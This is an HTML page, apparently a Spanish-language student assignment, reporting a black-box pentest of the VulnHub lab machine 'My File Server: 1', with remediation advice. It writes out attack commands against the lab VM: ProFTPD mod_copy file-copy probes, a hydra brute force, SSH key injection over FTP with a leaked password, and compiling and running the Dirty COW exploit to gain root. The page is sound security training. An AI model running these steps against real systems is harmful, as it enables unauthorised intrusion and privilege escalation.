@@ -1,0 +1,671 @@
+<!DOCTYPE html>
+<html lang="es" data-base="../">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Actividad 13 – Red Team Report: Pentesting de My File Server 1 | Monica Lopez</title>
+  <meta name="description" content="Actividad 13 del Parcial 2 de CNO IV – Seguridad Informática: informe de pentesting de caja negra sobre la máquina VulnHub My File Server: 1, con escalada de privilegios a root.">
+  <meta name="author" content="Monica Isabel Lopez Alcocer">
+
+  <link href="../assets/img/favicon.png" rel="icon">
+  <link href="../assets/img/apple-touch-icon.png" rel="apple-touch-icon">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fraunces:opsz,wght@9..144,400..700&family=Cormorant+Garamond:ital,wght@0,400;0,600;1,400&family=Nunito+Sans:opsz,wght@6..12,300..800&display=swap" rel="stylesheet">
+
+  <link href="../assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="../assets/vendor/aos/aos.css" rel="stylesheet">
+  <link href="../assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+
+  <link href="../assets/css/grimorio.css" rel="stylesheet">
+</head>
+
+<body class="pagina">
+
+  <div class="fondo-magico" aria-hidden="true"></div>
+  <a class="salto-contenido" href="#contenido-principal">Saltar al contenido</a>
+
+  <div id="topbar-container"></div>
+  <div id="sidebar-container"></div>
+
+  <div class="contenido">
+    <main id="contenido-principal" tabindex="-1">
+
+      <header class="cabecera-pagina">
+        <div class="contenedor">
+          <span class="eyebrow">Parcial 2 · Actividad 13</span>
+          <h1>Red Team Report: Pentesting de My File Server 1</h1>
+          <p class="subtitulo">Pentesting de caja negra sobre un servidor de archivos simulado: de una contraseña expuesta a control total como root</p>
+
+          <nav class="rastro rastro-centrado" aria-label="Ruta de navegación">
+            <ol>
+              <li><a href="../index.html">Inicio</a></li>
+              <li><a href="../parcial2.html">Parcial 2</a></li>
+              <li><span aria-current="page">Actividad 13</span></li>
+            </ol>
+          </nav>
+        </div>
+      </header>
+
+      <div class="contenedor">
+        <div class="actividad-layout">
+
+          <div class="actividad-principal">
+
+            <section class="seccion-actividad" id="introduccion" data-aos="fade-up">
+              <h2>Introducción</h2>
+              <p class="capitular">
+                Esta actividad documenta un ejercicio de Red Team (pentesting ofensivo) realizado sobre
+                <em>“My File Server: 1”</em>, una máquina virtual de VulnHub intencionalmente vulnerable que simula
+                un servidor de archivos corporativo. El objetivo fue evaluar, bajo un modelo de caja negra, el nivel
+                de exposición del sistema ante un atacante externo sin credenciales previas, siguiendo una
+                metodología formal de principio a fin: reconocimiento, enumeración, explotación, escalada de
+                privilegios y documentación del impacto.
+              </p>
+            </section>
+
+            <section class="seccion-actividad" id="resumen" data-aos="fade-up">
+              <h2>Resumen ejecutivo</h2>
+              <p>
+                La evaluación concluyó con el <strong>compromiso total del sistema</strong>: se obtuvo acceso como
+                administrador (root), el nivel máximo de privilegios posible. Partiendo únicamente de la conexión a
+                la red y sin credenciales previas, fue posible tomar control absoluto del servidor, acceder a la
+                totalidad de los archivos almacenados y detener el servicio por completo.
+              </p>
+              <p>
+                El vector de acceso inicial fue especialmente grave por su simplicidad: el servidor publicaba
+                <strong>credenciales válidas en texto plano</strong> en su propio sitio web, accesibles para cualquier
+                visitante. Esa credencial reutilizada permitió el ingreso al sistema, y una versión desactualizada del
+                kernel permitió escalar privilegios hasta root. El ejercicio evidencia que una sola mala práctica
+                puede anular todas las demás defensas del sistema.
+              </p>
+
+              <div class="nota-tecnica">
+                <strong>Nivel de riesgo global: CRÍTICO.</strong> El sistema permite el compromiso total y no
+                autenticado por parte de un atacante externo, con afectación máxima a la confidencialidad,
+                integridad y disponibilidad de la información.
+              </div>
+
+              <div class="tabla-envoltura">
+                <table>
+                  <thead><tr><th>Severidad</th><th>Cantidad</th></tr></thead>
+                  <tbody>
+                    <tr><td>Críticos</td><td>2</td></tr>
+                    <tr><td>Altos</td><td>2</td></tr>
+                    <tr><td>Medios</td><td>1</td></tr>
+                    <tr><td>Bajos</td><td>1</td></tr>
+                  </tbody>
+                </table>
+              </div>
+            </section>
+
+            <section class="seccion-actividad" id="alcance" data-aos="fade-up">
+              <h2>Alcance</h2>
+              <p>Límites de la evaluación: qué activos se incluyeron, qué acciones estaban autorizadas y bajo qué condiciones se realizó la prueba.</p>
+
+              <h3>Objetivos dentro del alcance</h3>
+              <div class="tabla-envoltura">
+                <table>
+                  <thead><tr><th>Parámetro</th><th>Valor</th></tr></thead>
+                  <tbody>
+                    <tr><td>Máquina objetivo</td><td>My File Server: 1 (VM VulnHub en VirtualBox)</td></tr>
+                    <tr><td>Dirección IP objetivo</td><td>10.255.66.88 → 192.168.1.248 (cambió por reconfiguración de red)</td></tr>
+                    <tr><td>IP del atacante (Kali)</td><td>10.255.66.204 / 192.168.1.x</td></tr>
+                    <tr><td>Segmento de red</td><td>Red aislada de VirtualBox (misma red para atacante y objetivo)</td></tr>
+                    <tr><td>Tipo de prueba</td><td>Caja negra (Black Box) — sin credenciales previas</td></tr>
+                    <tr><td>Fecha / ventana</td><td>01/10/2026</td></tr>
+                  </tbody>
+                </table>
+              </div>
+
+              <h3>Fuera del alcance</h3>
+              <ul>
+                <li>Ataques de denegación de servicio (DoS/DDoS) sobre la infraestructura.</li>
+                <li>Ingeniería social o phishing a usuarios reales.</li>
+                <li>Cualquier sistema, host o red distinto a la máquina objetivo autorizada.</li>
+              </ul>
+
+              <h3>Reglas de enfrentamiento</h3>
+              <ul>
+                <li>La prueba se realizó únicamente en un laboratorio virtual aislado, sin conexión a redes productivas.</li>
+                <li>Todas las actividades ofensivas se ejecutaron sobre un sistema intencionalmente vulnerable, diseñado para fines educativos.</li>
+                <li>No se manipuló ni exfiltró información de terceros; los datos son ficticios y propios del laboratorio.</li>
+              </ul>
+            </section>
+
+            <section class="seccion-actividad" id="metodologia" data-aos="fade-up">
+              <h2>Metodología aplicada</h2>
+              <p>
+                La evaluación siguió una metodología formal alineada con el estándar de la industria
+                <strong>PTES</strong> (Penetration Testing Execution Standard) y las guías de <strong>OWASP</strong>,
+                garantizando un proceso reproducible, sistemático y trazable.
+              </p>
+              <ol>
+                <li><strong>Reconocimiento:</strong> descubrimiento del host objetivo dentro de la red y recolección de información inicial.</li>
+                <li><strong>Enumeración:</strong> identificación de puertos, servicios, versiones y vectores de ataque potenciales.</li>
+                <li><strong>Explotación:</strong> aprovechamiento de una vulnerabilidad para obtener acceso al sistema.</li>
+                <li><strong>Escalada de privilegios:</strong> elevación de permisos hasta obtener control total (root).</li>
+                <li><strong>Análisis de impacto y documentación:</strong> evaluación del riesgo según el modelo CIA y elaboración del informe.</li>
+              </ol>
+
+              <h3>Herramientas utilizadas</h3>
+              <div class="tabla-envoltura">
+                <table>
+                  <thead><tr><th>Categoría</th><th>Herramienta(s)</th></tr></thead>
+                  <tbody>
+                    <tr><td>Virtualización</td><td>Oracle VirtualBox</td></tr>
+                    <tr><td>Sistema atacante</td><td>Kali Linux</td></tr>
+                    <tr><td>Descubrimiento de red</td><td>netdiscover, nmap (-sn)</td></tr>
+                    <tr><td>Escaneo / enumeración</td><td>nmap, whatweb, gobuster, enum4linux, smbclient, showmount</td></tr>
+                    <tr><td>Explotación</td><td>netcat (nc), Metasploit, hydra, ftp, ssh, curl</td></tr>
+                    <tr><td>Post-explotación</td><td>comandos nativos de Linux, gcc, exploit Dirty COW (40616.c)</td></tr>
+                  </tbody>
+                </table>
+              </div>
+            </section>
+
+            <section class="seccion-actividad" id="reconocimiento" data-aos="fade-up">
+              <h2>Fase de reconocimiento</h2>
+              <p>Se identificó la dirección IP de la máquina objetivo dentro del segmento de red del laboratorio y se verificó su disponibilidad.</p>
+
+              <h3>Descubrimiento del host</h3>
+              <p>Barrido de la red para localizar el host objetivo, identificado por su dirección MAC (prefijo <code>08:00:27</code>, propio de VirtualBox):</p>
+              <pre><code># Descubrimiento de hosts activos en la red del laboratorio
+sudo netdiscover -r &lt;segmento&gt;/24</code></pre>
+
+              <figure class="evidencia" data-aos="fade-up">
+                <a href="../assets/img/evidencias/parcial2/act13-5-1.jpeg" class="glightbox" data-gallery="act13" data-title="Captura 5.1 — netdiscover">
+                  <img src="../assets/img/evidencias/parcial2/act13-5-1.jpeg" alt="Resultado de netdiscover mostrando la IP y MAC de la máquina objetivo" loading="lazy">
+                </a>
+                <figcaption>Captura 5.1. Resultado de netdiscover mostrando la IP y MAC de la máquina objetivo My File Server.</figcaption>
+              </figure>
+
+              <p>Con base en el barrido se identificó la IP de la máquina objetivo (inicialmente 10.255.66.88 y, tras reconfigurar la red, 192.168.1.248).</p>
+
+              <h3>Verificación de conectividad</h3>
+              <pre><code>ping -c 3 &lt;IP_objetivo&gt;</code></pre>
+
+              <figure class="evidencia" data-aos="fade-up">
+                <a href="../assets/img/evidencias/parcial2/act13-5-2.jpeg" class="glightbox" data-gallery="act13" data-title="Captura 5.2 — ping">
+                  <img src="../assets/img/evidencias/parcial2/act13-5-2.jpeg" alt="Prueba de ping exitosa contra la IP objetivo" loading="lazy">
+                </a>
+                <figcaption>Captura 5.2. Prueba de ping exitosa contra la IP objetivo (confirma que la VM responde).</figcaption>
+              </figure>
+            </section>
+
+            <section class="seccion-actividad" id="enumeracion" data-aos="fade-up">
+              <h2>Fase de enumeración</h2>
+              <p>Una vez ubicado el objetivo, se enumeraron los puertos abiertos, los servicios en ejecución y sus versiones.</p>
+
+              <h3>Escaneo de puertos y servicios</h3>
+              <pre><code># Escaneo completo de puertos con detección de versiones y scripts
+nmap -sC -sV -p- -T4 &lt;IP_objetivo&gt; -oN nmap_completo.txt</code></pre>
+
+              <figure class="evidencia" data-aos="fade-up">
+                <a href="../assets/img/evidencias/parcial2/act13-6-1.png" class="glightbox" data-gallery="act13" data-title="Captura 6.1 — nmap">
+                  <img src="../assets/img/evidencias/parcial2/act13-6-1.png" alt="Salida completa de nmap mostrando puertos abiertos, servicios y versiones" loading="lazy">
+                </a>
+                <figcaption>Captura 6.1. Salida completa de nmap mostrando puertos abiertos, servicios y versiones detectadas.</figcaption>
+              </figure>
+
+              <h3>Análisis de servicios</h3>
+              <div class="tabla-envoltura">
+                <table>
+                  <thead><tr><th>Puerto</th><th>Servicio</th><th>Versión</th></tr></thead>
+                  <tbody>
+                    <tr><td>21/tcp</td><td>ftp</td><td>vsftpd 3.0.2</td></tr>
+                    <tr><td>22/tcp</td><td>ssh</td><td>OpenSSH 7.4 (protocolo 2.0)</td></tr>
+                    <tr><td>80/tcp</td><td>http</td><td>Apache httpd 2.4.6 (CentOS)</td></tr>
+                    <tr><td>111/tcp</td><td>rpcbind</td><td>2-4 (RPC #100000)</td></tr>
+                    <tr><td>445/tcp</td><td>netbios-ssn</td><td>Samba smbd 3.X - 4.X</td></tr>
+                    <tr><td>2049/tcp</td><td>nfs_acl</td><td>3 (RPC #100227) — NFS</td></tr>
+                    <tr><td>2121/tcp</td><td>ftp</td><td>ProFTPD 1.3.5</td></tr>
+                    <tr><td>20048/tcp</td><td>mountd</td><td>1-3 (RPC #100005)</td></tr>
+                  </tbody>
+                </table>
+              </div>
+              <p>
+                El sistema se comporta como un servidor de archivos: expone Samba (445) y NFS (2049/20048), además
+                de dos servicios FTP distintos y un servidor web. Dos elementos destacaron como superficie de
+                ataque prioritaria: Samba con acceso anónimo, y sobre todo <strong>ProFTPD 1.3.5</strong> en el
+                puerto 2121, una versión históricamente vulnerable (<code>CVE-2015-3306</code>).
+              </p>
+
+              <h3>Enumeración del servicio SMB</h3>
+              <pre><code># Servicio web
+whatweb http://&lt;IP&gt;
+# Recursos compartidos (SMB)
+enum4linux -a &lt;IP&gt;
+smbclient -L //&lt;IP&gt;/ -N</code></pre>
+
+              <figure class="evidencia" data-aos="fade-up">
+                <a href="../assets/img/evidencias/parcial2/act13-6-2.jpeg" class="glightbox" data-gallery="act13" data-title="Captura 6.2 — enum4linux">
+                  <img src="../assets/img/evidencias/parcial2/act13-6-2.jpeg" alt="Evidencia de la enumeración del servicio SMB con enum4linux" loading="lazy">
+                </a>
+                <figcaption>Captura 6.2. Evidencia de la enumeración del servicio SMB con enum4linux.</figcaption>
+              </figure>
+
+              <p>
+                Se confirmó que el servidor permite <strong>sesiones anónimas</strong> (usuario y contraseña vacíos).
+                A partir de esa sesión se enumeraron los recursos compartidos: <code>print$</code>,
+                <code>smbdata</code>, <code>smbuser</code> e <code>IPC$</code>. De estos, <strong>smbdata</strong>
+                resultó accesible y legible de forma anónima, mientras que <code>print$</code> y
+                <code>smbuser</code> denegaron el acceso.
+              </p>
+              <p>
+                Mediante RID cycling se identificó la cuenta local <code>smbuser</code> y una política de
+                contraseñas débil (complejidad deshabilitada, longitud mínima de 5 caracteres). El hallazgo más
+                relevante de esta fase es la exposición anónima del recurso <strong>smbdata</strong>, aprovechada en
+                la fase de explotación.
+              </p>
+            </section>
+
+            <section class="seccion-actividad" id="explotacion" data-aos="fade-up">
+              <h2>Fase de explotación</h2>
+              <p>
+                Por cada servicio expuesto se formuló una hipótesis de ataque, se probó y, según el resultado, se
+                decidió continuar o pivotar hacia otro vector. A continuación se documenta ese proceso de
+                razonamiento completo.
+              </p>
+
+              <div class="nota-tecnica">
+                <strong>Nota sobre el direccionamiento:</strong> durante la evaluación la topología de red se
+                reconfiguró, por lo que la IP objetivo cambió de 10.255.66.88 a 192.168.1.248. Ambas direcciones
+                corresponden a la misma máquina virtual (MAC 08:00:27:xx, adaptador de VirtualBox).
+              </div>
+
+              <h3>Análisis de vectores</h3>
+
+              <div class="resultado-vector">
+                <span class="etiqueta-resultado">Vector 1</span>
+                <h3>Recurso compartido SMB anónimo</h3>
+                <p>
+                  Hipótesis: siendo un “servidor de archivos”, alguna carpeta compartida podría contener
+                  credenciales. Se descargó todo el contenido de <code>smbdata</code> de forma anónima:
+                </p>
+                <pre><code>smbclient //&lt;IP&gt;/smbdata -N
+recurse ON
+prompt OFF
+mget *</code></pre>
+
+                <figure class="evidencia" data-aos="fade-up">
+                  <a href="../assets/img/evidencias/parcial2/act13-vector1-smbclient.png" class="glightbox" data-gallery="act13" data-title="smbclient — primer intento">
+                    <img src="../assets/img/evidencias/parcial2/act13-vector1-smbclient.png" alt="Primer intento de smbclient fallando por falta de herramientas en el sistema" loading="lazy">
+                  </a>
+                  <figcaption>Primer intento de descarga con smbclient (faltaban utilidades en el sistema atacante).</figcaption>
+                </figure>
+
+                <p>El recurso exponía los registros del sistema (<code>/var/log</code>) —una filtración de información en sí misma—, así que se buscaron credenciales dentro de los logs:</p>
+                <pre><code>grep -iE "invalid user|password|smbuser" secure messages xferlog</code></pre>
+
+                <figure class="evidencia" data-aos="fade-up">
+                  <a href="../assets/img/evidencias/parcial2/act13-vector1-logs.png" class="glightbox" data-gallery="act13" data-title="Logs filtrados por smbdata">
+                    <img src="../assets/img/evidencias/parcial2/act13-vector1-logs.png" alt="Líneas de los logs del sistema con menciones a Password, filtradas vía el recurso smbdata" loading="lazy">
+                  </a>
+                  <figcaption>Líneas de /var/log/messages filtradas desde el recurso smbdata expuesto.</figcaption>
+                </figure>
+
+                <p><strong>Resultado:</strong> los logs confirmaban al usuario <code>smbuser</code> y accesos de root, pero ninguna contraseña en texto plano. Pista insuficiente.</p>
+              </div>
+
+              <div class="resultado-vector">
+                <span class="etiqueta-resultado">Profundización</span>
+                <h3>Registros de auditoría e instalación</h3>
+                <p>Se intentó decodificar el registro de auditoría (<code>audit.log</code>) en busca de pulsaciones de teclado, y se revisó la carpeta de instalación (kickstart) en busca de hashes de root:</p>
+                <pre><code>grep -oP '(?&lt;=type=)\w+' audit.log | sort | uniq -c
+grep -riE "rootpw|iscrypted|\$6\$|\$1\$" .</code></pre>
+
+                <figure class="evidencia" data-aos="fade-up">
+                  <a href="../assets/img/evidencias/parcial2/act13-profundizacion-aureport.png" class="glightbox" data-gallery="act13" data-title="aureport sobre audit.log">
+                    <img src="../assets/img/evidencias/parcial2/act13-profundizacion-aureport.png" alt="Inventario de tipos de registro de audit.log, sin eventos TTY con contraseñas" loading="lazy">
+                  </a>
+                  <figcaption>Inventario de eventos de audit.log: sin registros TTY que revelen contraseñas.</figcaption>
+                </figure>
+
+                <p><strong>Resultado:</strong> sin registros TTY ni hashes de contraseña. Se agotó la vía de los registros.</p>
+              </div>
+
+              <figure class="evidencia" data-aos="fade-up">
+                <a href="../assets/img/evidencias/parcial2/act13-7-1.png" class="glightbox" data-gallery="act13" data-title="Captura 7.1 — vectores evaluados">
+                  <img src="../assets/img/evidencias/parcial2/act13-7-1.png" alt="Proceso de evaluación de vectores: acceso anónimo SMB y prueba de ProFTPD mod_copy" loading="lazy">
+                </a>
+                <figcaption>Captura 7.1. Proceso de evaluación de vectores (acceso anónimo SMB y prueba de ProFTPD mod_copy).</figcaption>
+              </figure>
+
+              <div class="resultado-vector">
+                <span class="etiqueta-resultado">Vector 2</span>
+                <h3>ProFTPD 1.3.5 y mod_copy (CVE-2015-3306)</h3>
+                <p>
+                  ProFTPD 1.3.5 en el puerto 2121 es vulnerable a un fallo en <code>mod_copy</code> que permite
+                  copiar archivos sin autenticación mediante <code>SITE CPFR</code> / <code>SITE CPTO</code>.
+                  Hipótesis: si se podía escribir en el directorio web, se podría colocar un webshell.
+                </p>
+                <pre><code>nc &lt;IP&gt; 2121
+site cpfr /etc/passwd              # 350 ready -&gt; la LECTURA funciona
+site cpto /var/www/html/x.txt      # 550 Permission denied
+site cpto /var/log/test.txt        # 550 Permission denied</code></pre>
+                <p><strong>Resultado:</strong> se podían leer archivos arbitrarios sin autenticación (hallazgo real), pero el proceso corre sin privilegios de escritura. Se documentó como vulnerabilidad, pero se descartó como vía de acceso.</p>
+              </div>
+
+              <div class="resultado-vector">
+                <span class="etiqueta-resultado">Vector 3</span>
+                <h3>Fuerza bruta de credenciales</h3>
+                <pre><code>hydra -l smbuser -P /usr/share/wordlists/rockyou.txt ftp://&lt;IP&gt; -t 4</code></pre>
+
+                <figure class="evidencia" data-aos="fade-up">
+                  <a href="../assets/img/evidencias/parcial2/act13-vector3-hydra.jpeg" class="glightbox" data-gallery="act13" data-title="hydra — fuerza bruta FTP">
+                    <img src="../assets/img/evidencias/parcial2/act13-vector3-hydra.jpeg" alt="Ataque de fuerza bruta con hydra contra el FTP, abortado por la lentitud del servicio" loading="lazy">
+                  </a>
+                  <figcaption>Ataque de diccionario con hydra contra el FTP: ritmo demasiado lento para ser viable.</figcaption>
+                </figure>
+
+                <p><strong>Resultado:</strong> el servicio limitaba la velocidad a ~27 intentos por minuto (miles de horas estimadas). Se abortó para no perder tiempo.</p>
+              </div>
+
+              <div class="resultado-vector">
+                <span class="etiqueta-resultado">Vector 4</span>
+                <h3>Shellshock en CGI (CVE-2014-6271)</h3>
+                <pre><code>gobuster dir -u http://&lt;IP&gt;/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x sh,cgi,pl,py</code></pre>
+                <p><strong>Resultado:</strong> no existía ningún script CGI ejecutable; el vector no era aplicable.</p>
+              </div>
+
+              <p>
+                <strong>Conclusión del análisis:</strong> tras descartar cuatro vectores técnicos, se volvió a un
+                principio básico del pentesting —revisar lo más simple primero— e inspeccionar a fondo el contenido
+                del servicio web. Ahí estaba la vía de entrada real.
+              </p>
+
+              <h3>Vulnerabilidad explotada</h3>
+              <p>
+                <strong>Nombre:</strong> Exposición de credenciales en el servicio web (Sensitive Information
+                Disclosure). <strong>Servicio afectado:</strong> Apache 2.4.6 en el puerto 80. El servidor publica un
+                archivo accesible públicamente con credenciales válidas en texto plano del usuario
+                <code>smbuser</code>: una mala práctica elemental pero crítica, que vuelve irrelevantes todas las
+                demás protecciones.
+              </p>
+
+              <h3>Procedimiento de explotación</h3>
+              <p><strong>Paso 1 — Obtención de la credencial desde el servicio web:</strong></p>
+              <pre><code>curl http://&lt;IP&gt;/readme.txt</code></pre>
+              <p>Esto expuso la credencial en texto plano — usuario: <code>smbuser</code> / contraseña: <code>rootroot1</code>.</p>
+
+              <figure class="evidencia" data-aos="fade-up">
+                <a href="../assets/img/evidencias/parcial2/act13-7-2.png" class="glightbox" data-gallery="act13" data-title="Captura 7.2 — credenciales expuestas">
+                  <img src="../assets/img/evidencias/parcial2/act13-7-2.png" alt="Credenciales en texto plano expuestas en el servidor web" loading="lazy">
+                </a>
+                <figcaption>Captura 7.2. Credenciales en texto plano expuestas en el servidor web.</figcaption>
+              </figure>
+
+              <p><strong>Paso 2 — Acceso vía SSH.</strong> El servidor SSH no admite autenticación por contraseña (solo publickey), por lo que se reutilizó la credencial para iniciar sesión en el FTP e inyectar una llave pública propia:</p>
+              <pre><code>ssh-keygen -f mykey                   # generar par de llaves
+ftp &lt;IP&gt;                              # login: smbuser / rootroot1
+  mkdir .ssh
+  cd .ssh
+  put mykey.pub authorized_keys
+ssh -i mykey smbuser@&lt;IP&gt;             # acceso con la llave</code></pre>
+
+              <figure class="evidencia" data-aos="fade-up">
+                <a href="../assets/img/evidencias/parcial2/act13-7-3a.png" class="glightbox" data-gallery="act13" data-title="Captura 7.3a — SSH solo publickey">
+                  <img src="../assets/img/evidencias/parcial2/act13-7-3a.png" alt="El servidor SSH rechaza la autenticación por contraseña" loading="lazy">
+                </a>
+                <figcaption>Captura 7.3a. El servidor SSH rechaza la autenticación por contraseña (solo publickey).</figcaption>
+              </figure>
+
+              <h3>Evidencia de acceso obtenido</h3>
+              <pre><code>whoami      # smbuser
+id
+hostname    # fileserver</code></pre>
+
+              <figure class="evidencia" data-aos="fade-up">
+                <a href="../assets/img/evidencias/parcial2/act13-7-3b.png" class="glightbox" data-gallery="act13" data-title="Captura 7.3b — acceso SSH obtenido">
+                  <img src="../assets/img/evidencias/parcial2/act13-7-3b.png" alt="Sesión SSH establecida confirmando el compromiso inicial del sistema" loading="lazy">
+                </a>
+                <figcaption>Captura 7.3b. Sesión SSH establecida — confirmación del compromiso inicial del sistema.</figcaption>
+              </figure>
+            </section>
+
+            <section class="seccion-actividad" id="escalada" data-aos="fade-up">
+              <h2>Escalada de privilegios</h2>
+              <p>Con acceso inicial como <code>smbuser</code>, el objetivo fue elevar privilegios hasta root: primero reconocer el entorno, luego explotar el vector identificado.</p>
+
+              <h3>Reconocimiento post-explotación</h3>
+              <pre><code>sudo -l                              # permisos sudo del usuario
+find / -perm -4000 -type f 2&gt;/dev/null   # binarios con SUID
+uname -a                             # versión del kernel
+cat /etc/redhat-release              # versión del sistema operativo</code></pre>
+
+              <figure class="evidencia" data-aos="fade-up">
+                <a href="../assets/img/evidencias/parcial2/act13-8-1.png" class="glightbox" data-gallery="act13" data-title="Captura 8.1 — kernel desactualizado">
+                  <img src="../assets/img/evidencias/parcial2/act13-8-1.png" alt="Enumeración post-explotación: versión del kernel desactualizada" loading="lazy">
+                </a>
+                <figcaption>Captura 8.1. Enumeración post-explotación: versión del kernel desactualizada (uname -a).</figcaption>
+              </figure>
+
+              <p>
+                El comando <code>uname -a</code> reveló un kernel Linux serie 3.10.x (propio de CentOS 7 original),
+                susceptible a una de las vulnerabilidades más conocidas de Linux.
+              </p>
+
+              <h3>Vulnerabilidad identificada</h3>
+              <p>
+                <strong>Dirty COW (Copy-On-Write) — CVE-2016-5195.</strong> Una condición de carrera en el
+                subsistema de memoria del kernel que permite a un usuario sin privilegios escribir en archivos de
+                solo lectura mapeados en memoria, posibilitando modificar archivos críticos del sistema y obtener
+                privilegios de root.
+              </p>
+
+              <h3>Procedimiento de explotación</h3>
+              <p><strong>Paso 1 — Obtención del exploit</strong> (40616.c, Exploit-DB):</p>
+              <pre><code>searchsploit -m 40616</code></pre>
+              <p><strong>Paso 2 — Transferencia a la víctima</strong> reutilizando la llave SSH:</p>
+              <pre><code>scp -i mykey 40616.c smbuser@&lt;IP&gt;:/tmp/</code></pre>
+              <p><strong>Paso 3 — Compilación y ejecución.</strong> El exploit aprovecha la condición de carrera para modificar <code>/etc/passwd</code> y otorgar una shell de superusuario:</p>
+              <pre><code>cd /tmp
+gcc 40616.c -o raj -pthread
+./raj</code></pre>
+
+              <figure class="evidencia" data-aos="fade-up">
+                <a href="../assets/img/evidencias/parcial2/act13-8-2.jpeg" class="glightbox" data-gallery="act13" data-title="Captura 8.2 — Dirty COW">
+                  <img src="../assets/img/evidencias/parcial2/act13-8-2.jpeg" alt="Compilación y ejecución del exploit Dirty COW" loading="lazy">
+                </a>
+                <figcaption>Captura 8.2. Compilación y ejecución del exploit Dirty COW (40616.c).</figcaption>
+              </figure>
+
+              <h3>Confirmación del compromiso total</h3>
+              <pre><code>whoami              # root
+id                  # uid=0(root)
+cat /root/proof.txt</code></pre>
+
+              <figure class="evidencia" data-aos="fade-up">
+                <a href="../assets/img/evidencias/parcial2/act13-8-3.png" class="glightbox" data-gallery="act13" data-title="Captura 8.3 — acceso root">
+                  <img src="../assets/img/evidencias/parcial2/act13-8-3.png" alt="Acceso root conseguido: whoami/id mostrando uid=0(root) y la flag de root" loading="lazy">
+                </a>
+                <figcaption>Captura 8.3. Acceso root conseguido — whoami/id mostrando uid=0(root) y la flag de root.</figcaption>
+              </figure>
+
+              <p>Con la obtención de privilegios de root se completó la cadena de ataque: desde un acceso anónimo inicial hasta el control absoluto del sistema operativo.</p>
+            </section>
+
+            <section class="seccion-actividad" id="impacto" data-aos="fade-up">
+              <h2>Análisis de impacto (modelo CIA)</h2>
+              <p>Al haberse obtenido privilegios de root, los tres pilares de la seguridad de la información se ven comprometidos en su máximo nivel.</p>
+
+              <div class="tabla-envoltura">
+                <table>
+                  <thead><tr><th>Pilar</th><th>Nivel</th><th>Justificación</th></tr></thead>
+                  <tbody>
+                    <tr><td>Confidencialidad</td><td>Alto</td><td>Con root se puede leer la totalidad de los archivos del servidor, incluidos datos de usuarios, credenciales (/etc/shadow) y toda la documentación almacenada.</td></tr>
+                    <tr><td>Integridad</td><td>Alto</td><td>Como root es posible crear, modificar o eliminar cualquier archivo o configuración sin restricción.</td></tr>
+                    <tr><td>Disponibilidad</td><td>Alto</td><td>El control total permite detener servicios, cifrar o borrar la información (ransomware) o apagar el servidor.</td></tr>
+                  </tbody>
+                </table>
+              </div>
+
+              <h3>Escenario de impacto empresarial</h3>
+              <p>
+                Si “My File Server” fuera un servidor corporativo real, un atacante sin credenciales podría
+                apoderarse de toda la documentación de la organización —contratos, información financiera, datos de
+                clientes y empleados, propiedad intelectual—, alterarla o destruirla, desplegar ransomware, o usar el
+                servidor como punto de pivote hacia el resto de la red interna. Las consecuencias incluirían pérdidas
+                económicas directas, sanciones legales por fuga de datos personales y un daño reputacional difícil
+                de revertir. Un único fallo de configuración —una contraseña expuesta— bastaría para desencadenar
+                todo este escenario.
+              </p>
+            </section>
+
+            <section class="seccion-actividad" id="recomendaciones" data-aos="fade-up">
+              <h2>Recomendaciones técnicas</h2>
+
+              <h3>Prioridad alta (remediar de inmediato)</h3>
+              <ul>
+                <li><strong>Eliminar las credenciales expuestas en el servidor web (F-03):</strong> retirar el archivo que publica la contraseña y rotar la credencial comprometida de smbuser.</li>
+                <li><strong>Actualizar el kernel y el sistema operativo (F-06):</strong> aplicar los parches que corrigen Dirty COW y migrar a una versión soportada de CentOS.</li>
+                <li><strong>Actualizar ProFTPD (F-02):</strong> migrar a una versión ≥ 1.3.5a o deshabilitar mod_copy.</li>
+              </ul>
+
+              <h3>Prioridad media (corto plazo)</h3>
+              <ul>
+                <li><strong>Deshabilitar el acceso anónimo en Samba y NFS (F-01):</strong> exigir autenticación y no exponer /var/log a través de los recursos compartidos.</li>
+                <li><strong>Fortalecer la política de contraseñas (F-05):</strong> habilitar complejidad, longitud mínima de 12+ caracteres y bloqueo tras intentos fallidos.</li>
+                <li><strong>Asegurar la configuración SSH (F-04):</strong> mantener deshabilitada la autenticación por contraseña y revisar permisos de los directorios de usuario.</li>
+              </ul>
+
+              <h3>Prioridad baja / buenas prácticas</h3>
+              <ul>
+                <li>Aplicar el principio de mínimo privilegio en usuarios y servicios.</li>
+                <li>Mantener el sistema y todos los servicios actualizados con los últimos parches.</li>
+                <li>Reducir la superficie de ataque deshabilitando servicios innecesarios (p. ej. uno de los dos FTP).</li>
+                <li>Implementar monitoreo y registro centralizado para detectar accesos anónimos y actividad sospechosa.</li>
+              </ul>
+            </section>
+
+            <section class="seccion-actividad" id="hallazgos" data-aos="fade-up">
+              <h2>Tabla de hallazgos</h2>
+              <p>Resumen consolidado de las vulnerabilidades identificadas, ordenadas por severidad.</p>
+
+              <div class="tabla-envoltura">
+                <table>
+                  <thead><tr><th>ID</th><th>Vulnerabilidad</th><th>Severidad</th><th>Impacto</th><th>Recomendación</th></tr></thead>
+                  <tbody>
+                    <tr><td>F-03</td><td>Credenciales en texto plano expuestas en el servidor web</td><td>Crítica</td><td>Acceso inicial al sistema (SSH)</td><td>Retirar el archivo y rotar la credencial</td></tr>
+                    <tr><td>F-06</td><td>Kernel desactualizado vulnerable a Dirty COW (CVE-2016-5195)</td><td>Crítica</td><td>Escalada a root / compromiso total</td><td>Actualizar kernel y SO</td></tr>
+                    <tr><td>F-01</td><td>Recurso SMB "smbdata" accesible de forma anónima (exposición de /var/log)</td><td>Alta</td><td>Fuga de información del sistema</td><td>Deshabilitar acceso anónimo en Samba</td></tr>
+                    <tr><td>F-02</td><td>ProFTPD 1.3.5 mod_copy — lectura de archivos sin autenticación (CVE-2015-3306)</td><td>Alta</td><td>Lectura de archivos arbitrarios</td><td>Actualizar ProFTPD / deshabilitar mod_copy</td></tr>
+                    <tr><td>F-04</td><td>Inyección de llave SSH vía FTP con credencial reutilizada</td><td>Media</td><td>Persistencia de acceso</td><td>Revisar permisos de /home y del FTP</td></tr>
